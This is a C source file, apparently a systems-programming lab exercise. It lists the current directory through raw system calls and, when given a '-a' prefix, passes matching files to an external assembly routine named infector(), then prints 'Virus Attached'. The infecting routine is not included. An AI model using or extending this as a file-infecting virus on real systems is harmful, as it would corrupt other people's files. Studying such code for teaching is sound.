#include "util.h"
#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define new_line "\n"
#define size 8192 /*max size of entire directory*/
extern void infector();
extern void infection();
extern int system_call();

struct entries /*structure for directories entries*/
{
    unsigned long entry;
    int next_off;
    unsigned short len;
    char name[];
};

int main(int argc, char *argv[], char *envp[]) /*referenced from the getdents manual*/
{
    char* attachor=0;
    int j;
    for(j=0;j<argc;j++){
        if(strncmp(argv[j],"-a",2)==0){
         attachor=argv[j]+2;/*incrementing the pointer*/}
    }
    int fd;
    long num_byets; /*number of bytes that syscallk returns*/
    char directs[size];
    struct entries *e;
    char file_t;
 
    fd=system_call(SYS_OPEN,".",0,00200000); /*read only and directory for opening cur directory*/
    if(fd<0){
        system_call(4,1,"error1",6);
        system_call(1,0x55);/*exiting with exit code 0x55*/
        
    }
    while (1)
    {
        num_byets=system_call(141,fd,directs,size); /*78 is the num for sys_getdents, opening cur diirectory*/
         if(num_byets==0)
        break;
        else if(num_byets==-1){ /*no directories to print*/
         system_call(4,1,"error2",6);
         system_call(1,0x55);/*exiting with exit code 0x55*/
         }
        long i;
        if(num_byets>0)
         for(i=0;i<num_byets;){
          e=(struct entries*)(directs+i);
          file_t=*(directs+i+e->len-1);
          char* direct_t=((file_t==8)?"regular":
                         (file_t==4)?"directory":
                         (file_t==1)?"FIFO":
                         (file_t==12)?"socket":
                          (file_t==10)?"symlink":
                          (file_t==6)?"block dev":
                          (file_t==2)?"char dev":"???");
        if(attachor==0||strncmp((e->name),attachor,strlen(attachor))==0){/*theres no attachor or it is a part of direc*/
         system_call(4,1,e->name,strlen(e->name));
         system_call(4,1,"        ",8);/*8 spaces*/
         system_call(4,1,direct_t,strlen(direct_t));
         system_call(4,1,new_line,1);/*go down a line*/
         if(attachor!=0)/*this means our files have a virus attatchement*/{
         /*call assembly function*/
         
         infector(e->name);
        system_call(4,1,"Virus Attached\n",15);
        /*call assembly fucntion*/
         infection();/*print hello infected*/
         }
         
        }
         i+=e->len;
         }
    }
  system_call(1,0);/*exit success*/
  return 0;
}